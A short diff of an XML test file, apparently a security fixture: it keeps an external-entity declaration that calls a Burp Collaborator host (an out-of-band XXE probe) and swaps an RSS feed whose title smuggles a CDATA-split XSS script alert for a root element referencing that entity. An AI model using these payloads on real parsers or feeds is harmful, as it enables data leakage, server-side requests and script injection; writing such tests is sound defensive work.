@@ -3,18 +3,4 @@
 <!ELEMENT r ANY >
 <!ENTITY sp SYSTEM "https://xxe.qpj9rzij4ipz9h3886tx5z9es5y4mt.burpcollaborator.net/xxe.txt">
 ]>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-<channel>
-    <title>The Blog</title>
-    <link>http://example.com/</link>
-    <description>A blog about things</description>
-    <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
-    <item>
-        <title><![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]></title>
-        <link>http://example.com</link>
-        <description>a post</description>
-        <author>author@example.com</author>
-        <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
-    </item>
-</channel>
-</rss>
+<r>&sp;</r>
